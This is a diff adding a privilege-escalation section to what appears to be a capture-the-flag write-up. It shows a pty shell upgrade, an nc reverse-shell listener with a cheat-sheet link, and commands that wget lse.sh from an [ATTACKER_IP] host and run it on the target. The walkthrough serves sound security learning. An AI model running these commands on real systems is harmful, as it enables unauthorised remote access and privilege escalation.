@@ -95,3 +95,27 @@ Now it doesn't work. I re-check the url, and see that I need to append /elFinder
 <img width="572" height="143" alt="Initial_access_lookup" src="https://github.com/user-attachments/assets/a5f9eb7b-81b9-40ed-bc0f-449aa1050326" />
 
 ### Privilege Escalation
+
+Since we have an unstable shell, we'll try to get more stable one. We try to use the python3 one-liner:
+```python
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+but this doesn't work to the desired effect.
+
+Let's try a reverse shell. We set up a listener on our attacker using the command nc -lvnp 4444, and then execute a bash one-liner found at https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet on the target machine, which also doesn't work. Using the python3 variant does, however, and we can now continue with our goal of privilege escalation.
+
+When we run sudo -l, listing all the command we are allowed to execute as root without a password, we hit a password prompt. Since we don't know the password, we leave that for now.
+In the home directory of the user *think* we can see user.txt, but we don't have permission to read it.
+
+After looking around for a bit longer, I decide to use a very handy script to look for privilege escalation vectors, *lse.sh*. You can download it here: https://github.com/diego-treitos/linux-smart-enumeration
+
+Since the target isn't connected to the internet, we need to download the file and transfer it. After downloading, we run 
+``` python
+python3 -m http.server 8080
+```
+on our attacker machine, momentarily hosting a webserver with our files. On the target, we now run 
+``` bash
+wget http://[ATTACKER_IP]:8080/lse.sh
+chmod +x lse.sh
+./lse.sh
+```
